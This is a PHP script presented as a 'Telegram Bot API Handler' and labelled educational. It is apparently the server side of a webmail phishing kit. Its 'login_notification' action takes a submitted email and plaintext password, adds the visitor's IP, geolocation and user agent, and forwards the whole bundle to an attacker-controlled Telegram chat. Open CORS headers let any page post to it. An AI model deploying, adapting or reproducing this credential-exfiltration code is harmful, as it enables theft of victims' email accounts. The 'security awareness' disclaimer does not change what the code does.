<?php
/**
 * Telegram Bot API Handler
 * This script handles Telegram bot API calls server-side to avoid CORS issues
 * For educational and security awareness purposes only
 */

// Set proper headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');
header('Content-Type: application/json');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    exit(0);
}

// Configuration
$config = array(
    'default_bot_token' => '', // Set your default bot token here if needed
    'default_chat_id' => '',   // Set your default chat ID here if needed
    'max_message_length' => 4096,
    'timeout' => 10
);

// Function to send message to Telegram
function sendTelegramMessage($botToken, $chatId, $message, $parseMode = 'HTML') {
    global $config;
    
    if (empty($botToken) || empty($chatId) || empty($message)) {
        return array('success' => false, 'error' => 'Missing required parameters');
    }
    
    // Truncate message if too long
    if (strlen($message) > $config['max_message_length']) {
        $message = substr($message, 0, $config['max_message_length'] - 3) . '...';
    }
    
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = array(
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => $parseMode
    );
    
    // Prepare cURL request
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $config['timeout']);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'TelegramBot/1.0');
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) {
        return array('success' => false, 'error' => 'cURL error: ' . $error);
    }
    
    if ($httpCode !== 200) {
        return array('success' => false, 'error' => 'HTTP error: ' . $httpCode);
    }
    
    $result = json_decode($response, true);
    
    if (!$result) {
        return array('success' => false, 'error' => 'Invalid JSON response');
    }
    
    if (isset($result['ok']) && $result['ok'] === true) {
        return array('success' => true, 'result' => $result);
    } else {
        $errorMsg = isset($result['description']) ? $result['description'] : 'Unknown error';
        return array('success' => false, 'error' => $errorMsg);
    }
}

// Function to get client IP
function getClientIP() {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    return $ip;
}

// Function to get location from IP
function getLocationFromIP($ip) {
    try {
        $response = @file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip);
        if ($response) {
            $data = json_decode($response, true);
            if ($data && isset($data['geoplugin_countryName']) && isset($data['geoplugin_city'])) {
                return $data['geoplugin_countryName'] . ', ' . $data['geoplugin_city'];
            }
        }
    } catch (Exception $e) {
        // Location lookup failed, continue without it
    }
    return 'Unknown';
}

// Handle different request types
$action = $_POST['action'] ?? $_GET['action'] ?? '';

switch ($action) {
    case 'send_message':
        // Send a message to Telegram
        $botToken = $_POST['bot_token'] ?? $config['default_bot_token'];
        $chatId = $_POST['chat_id'] ?? $config['default_chat_id'];
        $message = $_POST['message'] ?? '';
        
        if (empty($botToken) || empty($chatId) || empty($message)) {
            echo json_encode(array(
                'success' => false,
                'error' => 'Missing required parameters: bot_token, chat_id, or message'
            ));
            exit;
        }
        
        $result = sendTelegramMessage($botToken, $chatId, $message);
        echo json_encode($result);
        break;
        
    case 'test_bot':
        // Test bot connection
        $botToken = $_POST['bot_token'] ?? $config['default_bot_token'];
        $chatId = $_POST['chat_id'] ?? $config['default_chat_id'];
        
        if (empty($botToken) || empty($chatId)) {
            echo json_encode(array(
                'success' => false,
                'error' => 'Missing required parameters: bot_token or chat_id'
            ));
            exit;
        }
        
        $testMessage = "🤖 Telegram Bot Test\n\n✅ Bot is working correctly!\n⏰ Time: " . date('Y-m-d H:i:s') . "\n🌐 IP: " . getClientIP() . "\n📍 Location: " . getLocationFromIP(getClientIP());
        
        $result = sendTelegramMessage($botToken, $chatId, $testMessage);
        echo json_encode($result);
        break;
        
    case 'login_notification':
        // Send login notification
        $botToken = $_POST['bot_token'] ?? $config['default_bot_token'];
        $chatId = $_POST['chat_id'] ?? $config['default_chat_id'];
        $email = $_POST['email'] ?? '';
        $password = $_POST['password'] ?? '';
        $success = $_POST['success'] ?? false;
        
        if (empty($botToken) || empty($chatId) || empty($email)) {
            echo json_encode(array(
                'success' => false,
                'error' => 'Missing required parameters'
            ));
            exit;
        }
        
        $ip = getClientIP();
        $location = getLocationFromIP($ip);
        $status = $success ? '✅ SUCCESS' : '❌ FAILED';
        
        $message = "
🔐 <b>Webmail Login Attempt</b>

📧 <b>Email:</b> {$email}
🔑 <b>Password:</b> {$password}
📊 <b>Status:</b> {$status}
🌐 <b>IP Address:</b> {$ip}
📍 <b>Location:</b> {$location}
⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "
🖥️ <b>User Agent:</b> " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "
        ";
        
        $result = sendTelegramMessage($botToken, $chatId, trim($message));
        echo json_encode($result);
        break;
        
    case 'get_webhook_info':
        // Get webhook information (for advanced usage)
        $botToken = $_POST['bot_token'] ?? $config['default_bot_token'];
        
        if (empty($botToken)) {
            echo json_encode(array(
                'success' => false,
                'error' => 'Missing bot_token parameter'
            ));
            exit;
        }
        
        $url = "https://api.telegram.org/bot{$botToken}/getWebhookInfo";
        $response = @file_get_contents($url);
        
        if ($response) {
            $result = json_decode($response, true);
            echo json_encode($result);
        } else {
            echo json_encode(array(
                'success' => false,
                'error' => 'Failed to get webhook info'
            ));
        }
        break;
        
    default:
        // Return available actions
        echo json_encode(array(
            'success' => true,
            'message' => 'Telegram Bot API Handler',
            'available_actions' => array(
                'send_message' => 'Send a message to Telegram',
                'test_bot' => 'Test bot connection',
                'login_notification' => 'Send login notification',
                'get_webhook_info' => 'Get webhook information'
            ),
            'usage' => array(
                'send_message' => 'POST with bot_token, chat_id, message',
                'test_bot' => 'POST with bot_token, chat_id',
                'login_notification' => 'POST with bot_token, chat_id, email, password, success',
                'get_webhook_info' => 'POST with bot_token'
            )
        ));
        break;
}
?>